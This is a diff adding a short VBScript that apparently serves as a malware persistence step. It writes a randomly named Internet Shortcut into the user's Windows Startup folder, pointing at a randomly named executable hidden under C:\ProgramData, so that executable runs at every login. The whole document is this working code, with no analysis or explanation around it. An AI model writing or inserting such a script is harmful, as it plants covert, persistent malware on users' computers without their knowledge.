@@ -1,0 +1,9 @@
+Set objFSO=CreateObject("Scripting.FileSystemObject")
+
+outFile="C:\Users\admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WTeEqNLdqe.url"
+
+Set objFile = objFSO.CreateTextFile(outFile,True)
+
+objFile.Write "[InternetShortcut]" & vbCrLf & "URL=""file:///C:\ProgramData\nEzJvZquBf\windvcmgr.exe"""
+
+objFile.Close
